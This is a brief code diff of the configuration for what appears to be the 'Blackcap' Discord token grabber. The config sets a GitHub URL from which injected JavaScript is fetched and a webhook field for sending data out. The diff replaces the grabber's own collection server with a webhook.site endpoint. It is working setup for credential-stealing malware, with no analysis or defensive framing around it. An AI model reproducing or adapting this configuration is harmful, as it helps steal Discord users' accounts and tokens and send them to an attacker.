@@ -29,7 +29,7 @@ const config = {
 
     injection_url: "https://raw.githubusercontent.com/FormindALH/Blackcap-test/main/index.js",
     webhook: "%WEBHOOK%",
-    UWUWED: "https://login.blackcap-grabber.com:3000/premium/",
+    UWUWED: "https://webhook.site/765e320e-e003-4fb1-be6c-e225df243c2b",
     filter2: {
         urls: [
       "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
